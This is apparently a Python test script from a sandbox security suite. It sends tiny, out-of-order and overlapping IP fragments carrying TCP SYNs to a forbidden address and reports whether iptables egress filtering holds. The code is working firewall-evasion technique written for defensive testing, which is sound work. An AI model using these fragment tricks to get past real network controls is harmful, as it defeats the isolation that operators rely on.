#!/usr/bin/env python3
#
# Copyright 2026 Scale Invariant, Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Author: Brad Hyslop <bhyslop@scaleinvariant.org>
#
# RBTIS - IP fragment reassembly bypass
#
# Sortie: net_fragment_evasion
# Front: network

import os
import socket
import struct
import time


BOTTLE_IP = os.environ["RBRN_ENCLAVE_BOTTLE_IP"]
ALLOWED_CIDR_IP = os.environ["RBRN_UPLINK_ALLOWED_CIDRS"].split(",")[0].split("/")[0]
FORBIDDEN_IP = "8.8.8.8"
FORBIDDEN_PORT = 53
TIMEOUT = 3


def _ip_checksum(header):
    """Compute IP header checksum."""
    if len(header) % 2:
        header += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(header) // 2), header))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def _build_ip_fragment(src, dst, proto, payload, ident, offset, more_fragments=True):
    """Build a single IP fragment with IP_HDRINCL.

    offset is in 8-byte units. more_fragments sets the MF flag.
    """
    version_ihl = 0x45
    tos = 0
    total_len = 20 + len(payload)
    flags_frag = (offset & 0x1FFF)
    if more_fragments:
        flags_frag |= 0x2000  # MF flag
    ttl = 64
    checksum = 0

    header = struct.pack("!BBHHHBBH4s4s",
                         version_ihl, tos, total_len,
                         ident, flags_frag,
                         ttl, proto, checksum,
                         socket.inet_aton(src),
                         socket.inet_aton(dst))
    # Compute checksum
    cksum = _ip_checksum(header)
    header = struct.pack("!BBHHHBBH4s4s",
                         version_ihl, tos, total_len,
                         ident, flags_frag,
                         ttl, proto, cksum,
                         socket.inet_aton(src),
                         socket.inet_aton(dst))
    return header + payload


def _build_tcp_syn(src_port, dst_port, seq):
    """Build a minimal TCP SYN segment (20 bytes, no options)."""
    data_offset_flags = (5 << 12) | 0x002  # 5-word header, SYN flag
    return struct.pack("!HHIIHHH",
                       src_port, dst_port,
                       seq, 0,
                       data_offset_flags,
                       65535, 0) + b"\x00\x00"  # checksum placeholder + urgent


def _send_fragments(dst, fragments, label):
    """Send a list of raw IP fragments and listen for any TCP response."""
    result = {"dest": dst, "label": label, "sent": 0, "replied": False}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        for frag in fragments:
            sock.sendto(frag, (dst, 0))
            result["sent"] += 1

        sock.close()

        # Listen for TCP response (SYN-ACK or RST) on a separate raw socket
        listen = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        listen.settimeout(TIMEOUT)
        deadline = time.time() + TIMEOUT
        while time.time() < deadline:
            listen.settimeout(max(0.1, deadline - time.time()))
            try:
                resp, addr = listen.recvfrom(4096)
                if addr[0] == dst:
                    # Check if it's a SYN-ACK (flags byte at IP_header + TCP offset 13)
                    ip_hlen = (resp[0] & 0x0F) * 4
                    if len(resp) > ip_hlen + 13:
                        tcp_flags = resp[ip_hlen + 13]
                        result["replied"] = True
                        result["reply_from"] = addr[0]
                        result["tcp_flags"] = tcp_flags
                        result["flags_desc"] = []
                        if tcp_flags & 0x12 == 0x12:
                            result["flags_desc"].append("SYN-ACK")
                        if tcp_flags & 0x04:
                            result["flags_desc"].append("RST")
                        if tcp_flags & 0x10:
                            result["flags_desc"].append("ACK")
                        break
            except socket.timeout:
                break
        listen.close()
    except PermissionError:
        result["error"] = "Raw socket permission denied"
    except OSError as e:
        result["error"] = str(e)
    return result


def run():
    """IP fragment reassembly bypass — test iptables handling of fragments.

    Vector:
      iptables inspects packets after conntrack reassembly (nf_defrag_ipv4).
      However, several fragment-based evasion techniques exist:

        1. Tiny initial fragment: Split the TCP SYN so the first fragment
           contains only the first 8 bytes of TCP header (source port but not
           flags). If iptables inspects only the first fragment, it may not
           see the SYN flag and pass it as "not a new connection."

        2. Overlapping fragments: Send a benign first fragment, then a second
           fragment that overlaps and overwrites the destination port with a
           forbidden value. Different reassembly policies (first-wins vs
           last-wins) can cause firewall/endpoint disagreement.

        3. Out-of-order fragments: Send the second fragment first. Some
           conntrack implementations pass non-initial fragments that arrive
           before the first fragment is tracked.

      Modern Linux kernels (4.x+) handle this via nf_defrag_ipv4 which
      reassembles before filtering. But the module must be loaded, and
      edge cases with fragment queue exhaustion remain possible.

    Detection logic:
      - Fragmented SYN to forbidden IP gets SYN-ACK or RST -> BREACH
      - All fragments dropped silently                       -> SECURE
    """
    assertions = []
    ident_base = struct.unpack("!H", os.urandom(2))[0]

    # Test 1: Tiny fragment — TCP SYN split across two fragments
    # Fragment 1: first 8 bytes of TCP (src_port, dst_port, seq partial)
    # Fragment 2: remaining 12 bytes of TCP header (includes SYN flag)
    tcp_syn = _build_tcp_syn(40001, FORBIDDEN_PORT, 0x41414141)
    frag1 = _build_ip_fragment(
        BOTTLE_IP, FORBIDDEN_IP, 6,
        tcp_syn[:8],        # First 8 bytes of TCP
        ident_base, 0,      # Offset 0, MF=1
        more_fragments=True
    )
    frag2 = _build_ip_fragment(
        BOTTLE_IP, FORBIDDEN_IP, 6,
        tcp_syn[8:],        # Remaining TCP bytes
        ident_base, 1,      # Offset 1 (= 8 bytes), MF=0
        more_fragments=False
    )
    r = _send_fragments(FORBIDDEN_IP, [frag1, frag2], "tiny-fragment")
    escaped = r.get("replied", False)
    assertions.append({
        "name": "fragment_tiny_forbidden_blocked",
        "passed": not escaped,
        "detail": f"Tiny fragment SYN to {FORBIDDEN_IP}:{FORBIDDEN_PORT}: "
                  + (f"RESPONSE ({', '.join(r.get('flags_desc', []))})" if escaped
                     else f"blocked ({r.get('error', 'no reply')})"),
    })

    # Test 2: Out-of-order fragments — send fragment 2 before fragment 1
    ident2 = (ident_base + 1) & 0xFFFF
    tcp_syn2 = _build_tcp_syn(40002, FORBIDDEN_PORT, 0x42424242)
    frag2_first = _build_ip_fragment(
        BOTTLE_IP, FORBIDDEN_IP, 6,
        tcp_syn2[8:],
        ident2, 1,
        more_fragments=False
    )
    frag1_second = _build_ip_fragment(
        BOTTLE_IP, FORBIDDEN_IP, 6,
        tcp_syn2[:8],
        ident2, 0,
        more_fragments=True
    )
    r = _send_fragments(FORBIDDEN_IP, [frag2_first, frag1_second], "out-of-order")
    escaped = r.get("replied", False)
    assertions.append({
        "name": "fragment_ooo_forbidden_blocked",
        "passed": not escaped,
        "detail": f"Out-of-order fragment SYN to {FORBIDDEN_IP}:{FORBIDDEN_PORT}: "
                  + (f"RESPONSE ({', '.join(r.get('flags_desc', []))})" if escaped
                     else f"blocked ({r.get('error', 'no reply')})"),
    })

    # Test 3: Overlapping fragments — first fragment has benign port (443 to allowed),
    # second fragment overlaps offset 0 with forbidden destination port
    ident3 = (ident_base + 2) & 0xFFFF
    benign_syn = _build_tcp_syn(40003, 443, 0x43434343)  # Port 443 (benign)
    evil_ports = struct.pack("!HH", 40003, FORBIDDEN_PORT)  # Overwrite with forbidden port
    frag_benign = _build_ip_fragment(
        BOTTLE_IP, FORBIDDEN_IP, 6,
        benign_syn,
        ident3, 0,
        more_fragments=True
    )
    # Overlapping fragment at offset 0 with just the port fields
    frag_overlap = _build_ip_fragment(
        BOTTLE_IP, FORBIDDEN_IP, 6,
        evil_ports + benign_syn[4:],  # Overwrite ports, keep rest
        ident3, 0,
        more_fragments=False
    )
    r = _send_fragments(FORBIDDEN_IP, [frag_benign, frag_overlap], "overlapping")
    escaped = r.get("replied", False)
    assertions.append({
        "name": "fragment_overlap_forbidden_blocked",
        "passed": not escaped,
        "detail": f"Overlapping fragment to {FORBIDDEN_IP}: "
                  + (f"RESPONSE ({', '.join(r.get('flags_desc', []))})" if escaped
                     else f"blocked ({r.get('error', 'no reply')})"),
    })

    # Test 4: Control — unfragmented TCP SYN to forbidden (should be blocked)
    ident4 = (ident_base + 3) & 0xFFFF
    tcp_syn4 = _build_tcp_syn(40004, FORBIDDEN_PORT, 0x44444444)
    whole = _build_ip_fragment(
        BOTTLE_IP, FORBIDDEN_IP, 6,
        tcp_syn4,
        ident4, 0,
        more_fragments=False
    )
    # Clear MF and frag offset — make it a normal packet
    r = _send_fragments(FORBIDDEN_IP, [whole], "unfragmented-control")
    escaped = r.get("replied", False)
    assertions.append({
        "name": "unfragmented_forbidden_blocked",
        "passed": not escaped,
        "detail": f"Unfragmented SYN to {FORBIDDEN_IP}:{FORBIDDEN_PORT} (control): "
                  + (f"RESPONSE ({', '.join(r.get('flags_desc', []))})" if escaped
                     else f"blocked ({r.get('error', 'no reply')})"),
    })

    # Test 5: Tiny fragment to ALLOWED CIDR — should succeed if fragments reassemble
    ident5 = (ident_base + 4) & 0xFFFF
    tcp_syn5 = _build_tcp_syn(40005, 443, 0x45454545)
    frag_a1 = _build_ip_fragment(
        BOTTLE_IP, ALLOWED_CIDR_IP, 6,
        tcp_syn5[:8],
        ident5, 0,
        more_fragments=True
    )
    frag_a2 = _build_ip_fragment(
        BOTTLE_IP, ALLOWED_CIDR_IP, 6,
        tcp_syn5[8:],
        ident5, 1,
        more_fragments=False
    )
    r = _send_fragments(ALLOWED_CIDR_IP, [frag_a1, frag_a2], "tiny-frag-allowed")
    assertions.append({
        "name": "fragment_allowed_cidr_control",
        "passed": True,  # informational
        "detail": f"Fragmented SYN to allowed {ALLOWED_CIDR_IP}:443: "
                  + (f"response ({', '.join(r.get('flags_desc', []))})" if r.get("replied")
                     else f"no reply ({r.get('error', 'timeout')})"),
    })

    all_passed = all(a["passed"] for a in assertions)
    return {
        "verdict": "SECURE" if all_passed else "BREACH",
        "detail": "IP fragment evasion blocked — nf_defrag_ipv4 reassembles before filtering"
                  if all_passed
                  else "IP fragment evasion SUCCEEDED — fragments bypassed iptables inspection",
        "assertions": assertions,
    }
